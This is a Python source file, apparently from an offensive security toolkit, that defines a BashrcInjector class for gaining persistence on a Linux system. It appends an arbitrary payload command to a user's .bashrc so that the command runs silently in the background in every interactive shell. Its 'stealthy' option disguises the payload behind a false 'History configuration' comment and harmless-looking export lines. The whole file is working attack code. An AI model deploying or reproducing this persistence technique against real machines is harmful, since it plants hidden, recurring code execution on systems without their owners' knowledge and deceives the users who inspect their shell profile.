import os
from ..core import ShellProfilePersistence
from ..utils.helpers import run_command

class BashrcInjector(ShellProfilePersistence):
    def inject(self, payload_command: str, stealthy: bool = True):
        bashrc = f"{self.home_dir}/.bashrc"

        if stealthy:
            payload = f"""
# History configuration - improves user experience
export HISTCONTROL=ignoredups:erasedups
export HISTSIZE=10000
export HISTFILESIZE=20000
{payload_command} &>/dev/null &
"""
        else:
            payload = f"\n{payload_command} &>/dev/null &\n"

        try:
            # Backup if not exists
            backup = f"{bashrc}.orig"
            if os.path.exists(bashrc) and not os.path.exists(backup):
                run_command(f"cp {bashrc} {backup}")

            with open(bashrc, 'a') as f:
                f.write(payload)

            print(f"[+] Payload injected into .bashrc")
            print(f"[+] File: {bashrc}")
            print(f"[+] Triggers: Every interactive shell")

            return {
                'method': 'bashrc_injection',
                'file': bashrc,
                'remove_cmd': f"sed -i '/{payload_command.split()[0]}/d' {bashrc}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None